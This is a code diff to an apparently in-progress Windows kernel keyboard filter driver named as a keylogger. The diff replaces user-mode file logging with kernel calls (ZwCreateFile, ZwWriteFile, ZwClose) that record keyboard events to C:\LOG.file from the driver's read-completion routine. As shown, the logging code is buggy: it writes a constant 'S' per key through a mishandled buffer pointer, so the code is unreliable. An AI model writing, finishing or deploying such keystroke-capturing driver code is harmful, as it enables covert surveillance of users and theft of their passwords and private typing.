@@ -98,6 +98,26 @@ AddDevice(
     device->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
     device->Flags &= ~DO_DEVICE_INITIALIZING;
 
+
+	NTSTATUS fi;
+	RtlInitUnicodeString(&TestName, L"\\??\\C:\\LOG.file");
+	InitializeObjectAttributes(&ObjAttr, &TestName,
+		OBJ_CASE_INSENSITIVE,
+		0, NULL);
+	FileStatus = ZwCreateFile(&TestFile,
+		FILE_WRITE_DATA,
+		&ObjAttr,
+		&IoStatus, NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		FILE_SHARE_WRITE,
+		FILE_OPEN_IF,
+		FILE_SYNCHRONOUS_IO_NONALERT,
+		NULL, 0);
+	if (FileStatus != STATUS_SUCCESS)
+	{
+		fi = FileStatus;
+		DbgPrint("omg");
+	}
     return status;
 }
 
@@ -113,7 +133,7 @@ NTSTATUS ReadCompletion(
 	PKEYBOARD_INPUT_DATA KeyData;
 	ULONG KeyCount;
 	ULONG i;
-
+	UNICODE_STRING buf;
 	if (Irp->IoStatus.Status == STATUS_SUCCESS)
 	{
 		KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
@@ -121,13 +141,13 @@ NTSTATUS ReadCompletion(
 
 		for (i = 0; i < KeyCount; i++)
 		{
-			FILE *file;
-
-			if ((file = fopen("LOGS.txt", "w")) == NULL)
-				printf("Can not open file!\n");
-			else 
-				fwrite(&KeyData[i].MakeCode, sizeof(int), 1, file);
-			fclose(file);
+			RtlInitUnicodeString(&buf, L"S");
+			ZwWriteFile(TestFile,
+				NULL, NULL, NULL,
+				&IoStatus,
+				&buf.Buffer,
+				buf.Length,
+				NULL, NULL);
 		}
 	}
 
@@ -466,7 +486,8 @@ KBKeyloggerPnP(
         
         IoSkipCurrentIrpStackLocation(Irp);
         status = IoCallDriver(devExt->TopOfStack, Irp);
-
+		
+		ZwClose(TestFile);
         IoDetachDevice(devExt->TopOfStack); 
         IoDeleteDevice(DeviceObject);
 
